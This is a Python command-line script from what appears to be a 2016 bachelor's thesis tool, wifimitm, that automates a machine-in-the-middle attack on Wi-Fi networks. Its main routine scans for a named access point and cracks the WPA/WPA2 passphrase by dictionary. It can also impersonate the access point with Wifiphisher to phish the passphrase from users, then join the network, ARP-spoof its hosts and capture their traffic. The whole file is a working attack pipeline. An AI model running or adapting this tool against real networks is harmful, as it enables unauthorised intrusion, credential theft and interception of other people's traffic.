#!/usr/bin/env python3
"""
Wi-Fi Machine-in-the-Middle - command line interface

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""

import argparse
import logging
import subprocess
import sys
import time
import warnings
from enum import Enum, unique
from pprint import saferepr
from typing import BinaryIO
from typing import Optional, Sequence

import coloredlogs

from .access import WirelessUnlocker, WirelessConnecter, list_wifi_interfaces
from .capture import Dumpcap
from .common import WirelessScanner
from .impersonation import Wifiphisher
from .model import WirelessAccessPoint
from .model import WirelessInterface
from .requirements import Requirements, RequirementError, UidRequirement, CommandRequirement
from .topology import ArpSpoofing
from .wpa2 import verify_psk, PassphraseNotInAnyDictionaryError

__version__ = '0.6.0'
__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


@unique
class ExitCode(Enum):
    """
    Return codes.
    Some are inspired by sysexits.h.
    """
    EX_OK = 0
    """Program terminated successfully."""

    ARGUMENTS = 2
    """Incorrect or missing arguments provided."""

    EX_UNAVAILABLE = 69
    """Required program or file does not exist."""

    EX_NOPERM = 77
    """Permission denied."""

    TARGET_AP_NOT_FOUND = 79
    """Target AP was not found during scan."""

    NOT_IN_ANY_DICTIONARY = 80
    """WPA/WPA2 passphrase was not found in any available dictionary."""

    PHISHING_INCORRECT_PSK = 81
    """WPA/WPA2 passphrase obtained from phishing attack is incorrect."""

    SUBPROCESS_ERROR = 82
    """Failure in subprocess occured."""

    KEYBOARD_INTERRUPT = 130
    """Program received SIGINT."""


def main():
    try:
        return wifimitmcli()
    except KeyboardInterrupt:
        print('Stopping.')
        return ExitCode.KEYBOARD_INTERRUPT.value
    except subprocess.CalledProcessError as e:
        logger.error(str(e) + ' ' + saferepr(e))
        print(str(e), file=sys.stderr)
        return ExitCode.SUBPROCESS_ERROR.value


def wifimitmcli():
    logging.captureWarnings(True)
    warnings.simplefilter('always', ResourceWarning)

    with Config() as config:
        #
        # Set up config
        #
        config.parse_args()
        if config.logging_level:
            coloredlogs.install(level=config.logging_level)
        else:
            logging.disable(logging.CRITICAL)
        logger.info('Config parsed from args.')
        logger.debug(str(config))

        #
        # Check all requirements
        #
        logger.info('Check all requirements.')
        try:
            Requirements.check_all()
        except RequirementError as e:
            if isinstance(e.requirement, UidRequirement):
                exitcode = ExitCode.EX_NOPERM
            else:
                exitcode = ExitCode.EX_UNAVAILABLE
            print(e.requirement.msg, file=sys.stderr)
            print('Requirements check failed.', file=sys.stderr)
            return exitcode.value
        else:
            logger.info('Requirements check successful.')

        # start successful
        print(config.PROGRAM_DESCRIPTION)

        #
        # Scan for target AP
        #
        with config.interface.monitor_mode():
            with WirelessScanner(interface=config.interface, write_interval=2) as scanner:
                print('Scanning networks.')
                time.sleep(6)
                scan = scanner.get_scan_result()

        target = None  # type: Optional[WirelessAccessPoint]
        for ap in scan:
            if ap.essid == config.essid:
                target = ap
                print("Target AP '{}' found.".format(target.essid))
                logger.info("Target AP '{}' found.".format(target.essid))
                break

        if target:
            #
            # Unlock target AP
            #
            print("Attack data stored at '{}'.".format(target.dir_path))
            with config.interface.monitor_mode(target.channel):
                try:
                    wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=config.interface)
                    print('Unlock targeted AP.')
                    wireless_unlocker.start()
                except PassphraseNotInAnyDictionaryError:
                    print('Passphrase not in any dictionary.')

            if not (target.is_cracked() or 'OPN' in target.encryption):
                if config.phishing_enabled:
                    # try phishing attack to catch password from users
                    print('Try to impersonate AP and perform a phishing attack.')
                    try:
                        print('Start wifiphisher.')
                        with Wifiphisher(ap=target, jamming_interface=config.interface) as wifiphisher:
                            while not wifiphisher.password:
                                wifiphisher.update()
                                if wifiphisher.state == wifiphisher.State.TERMINATED and not wifiphisher.password:
                                    raise Wifiphisher.UnexpectedTerminationError()
                                time.sleep(3)

                            if not verify_psk(target, wifiphisher.password):
                                print('Caught password is not correct.', file=sys.stderr)
                                return ExitCode.PHISHING_INCORRECT_PSK.value
                    except Wifiphisher.UnexpectedTerminationError:
                        print('Wifiphisher unexpectedly terminated.', file=sys.stderr)
                        return ExitCode.SUBPROCESS_ERROR.value
                else:
                    print('Phishing is not enabled and targeted AP is not cracked after previous attacks.\n'
                          'Attack unsuccessful.', file=sys.stderr)
                    return ExitCode.NOT_IN_ANY_DICTIONARY.value

            print('Targeted AP unlocked.')

            #
            # Connect to the network
            #
            print('Connecting to the AP.')
            with WirelessConnecter(interface=config.interface).connection(target):
                print('Connection successful.')

                #
                # Change the network topology
                #
                with ArpSpoofing(interface=config.interface) as arp_spoofing:
                    try:
                        print('Changing topology of network.')
                        print('Running until KeyboardInterrupt.')

                        #
                        # Capture network traffic, if capture file was specified
                        #
                        dumpcap = None
                        if config.capture_file:
                            dumpcap = Dumpcap(interface=config.interface, capture_file=config.capture_file)
                            print('Capturing network traffic.')
                        try:
                            while True:
                                arp_spoofing.update(print_stream=sys.stdout)
                                if dumpcap:
                                    dumpcap.update()
                                time.sleep(1)
                                # loop until KeyboardInterrupt
                        finally:
                            if dumpcap:
                                dumpcap.cleanup()
                    except KeyboardInterrupt:
                        print('Stopping.')
        else:
            print('Target AP not found during scan. Please make sure that you are within the signal reach of'
                  ' the specified AP and try again.', file=sys.stderr)
            logger.error('Target AP not found during scan. Please make sure that you are within the signal reach of'
                         ' the specified AP and try again.')
            return ExitCode.TARGET_AP_NOT_FOUND.value

    return ExitCode.EX_OK.value


class Config(object):
    PROGRAM_NAME = 'wifimitmcli'
    PROGRAM_DESCRIPTION = 'Wi-Fi Machine-in-the-Middle command-line interface'
    LOGGING_LEVELS_DICT = {'debug': logging.DEBUG,
                           'warning': logging.WARNING,
                           'info': logging.INFO,
                           'error': logging.ERROR,
                           'critical': logging.ERROR,
                           'disabled': None,  # logging disabled
                           }
    LOGGING_LEVEL_DEFAULT = 'disabled'

    def __init__(self):
        self.logging_level = None  # type: Optional[int]
        self.phishing_enabled = None  # type: Optional[bool]
        self.capture_file = None  # type: Optional[BinaryIO]
        self.essid = None  # type: Optional[str]
        self.interface = None  # type: Optional[WirelessInterface]

        self.parser = self.init_parser()  # type: argparse.ArgumentParser

    def __str__(self):
        return '<{} logging_level={}, essid={}, interface={!s}>'.format(
            type(self).__name__, logging.getLevelName(self.logging_level), self.essid, self.interface)

    @staticmethod
    def parser_type_wireless_interface(arg: str) -> WirelessInterface:
        """
        Parsers' interface argument conversion and checking.
        :type arg: str
        :param arg: interface argument
        :rtype: WirelessInterface

        Raises:
            argparse.ArgumentTypeError If given name is not a valid interface name.
        """
        try:
            i = WirelessInterface(arg)
        except ValueError:
            raise argparse.ArgumentTypeError('{} is not a valid interface name'.format(arg))
        else:
            logger.debug(str(i))
            return i

    @classmethod
    def init_parser(cls) -> argparse.ArgumentParser:
        """
        Initialize argument parser.
        :rtype: argparse.ArgumentParser
        :return: initialized parser
        """
        parser = argparse.ArgumentParser(
            prog=cls.PROGRAM_NAME,
            description=cls.PROGRAM_DESCRIPTION,
            epilog="Automation of MitM Attack on WiFi Networks, Bachelor's Thesis, UIFS FIT VUT,"
                   " Martin Vondracek, 2016."
        )
        parser.add_argument('-v', '--version', action='version', version='%(prog)s {}'.format(__version__))
        parser.add_argument('-ll', '--logging-level',
                            # NOTE: The type is called before check against choices. In order to display logging level
                            # names as choices, name to level int value conversion cannot be done here. Conversion is
                            # done after parser call in `self.parse_args`.
                            default=cls.LOGGING_LEVEL_DEFAULT,
                            choices=cls.LOGGING_LEVELS_DICT,
                            help='select logging level (default: %(default)s)'
                            )
        parser.add_argument('-p', '--phishing',
                            action='store_true',
                            help='enable phishing attack if dictionary attack fails',
                            )
        parser.add_argument('-cf', '--capture-file',
                            type=argparse.FileType('wb'),
                            help='capture network traffic to provided file',
                            metavar='FILE',
                            )
        parser.add_argument('essid',
                            help='essid of network for attack',
                            metavar='<essid>',
                            )
        parser.add_argument('interface',
                            type=cls.parser_type_wireless_interface,
                            help='wireless network interface for attack',
                            metavar='<interface>',
                            )
        return parser

    def parse_args(self, args: Optional[Sequence[str]] = None):
        """
        Parse command line arguments and store checked and converted values in self.
        `"By default, the argument strings are taken from sys.argv"
            <https://docs.python.org/3/library/argparse.html#argparse.ArgumentParser.parse_args>`_
        :type args: Optional[Sequence[str]]
        :param args: argument strings
        """
        # NOTE: Call to parse_args with namespace=self does not set logging_level with default value, if argument is not
        # in provided args, for some reason.
        parsed_args = self.parser.parse_args(args=args)

        if CommandRequirement('airmon-ng').check():
            # if airmon-ng is available, check for wireless interface name can be performed here,
            # if airmon-ng is NOT available, wifimitmcli will terminate upon requirements check after parsing args.
            # Check if provided interface name is recognized as wireless interface name.
            for i in list_wifi_interfaces():
                if i.name == parsed_args.interface.name:
                    break
            else:
                self.parser.error('argument interface: {} is not recognized as a valid wireless interface'.format(
                    parsed_args.interface.name)
                )

        # name to value conversion as noted in `self.init_parser`
        self.logging_level = self.LOGGING_LEVELS_DICT[parsed_args.logging_level]

        self.phishing_enabled = parsed_args.phishing

        if parsed_args.capture_file:
            # `"FileType objects understand the pseudo-argument '-' and automatically convert this into sys.stdin
            # for readable FileType objects and sys.stdout for writable FileType objects:"
            #   <https://docs.python.org/3/library/argparse.html>`_
            if parsed_args.capture_file is sys.stdout:
                self.parser.error('argument -cf/--capture-file: stdout is not allowed')

            # The capture_file is opened by `argparse.ArgumentParser.parse_args` to make sure its writable for us.
            self.capture_file = parsed_args.capture_file

        self.essid = parsed_args.essid
        self.interface = parsed_args.interface

    def cleanup(self):
        if self.capture_file:
            self.capture_file.close()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()

if __name__ == '__main__':
    status = main()
    sys.exit(status)
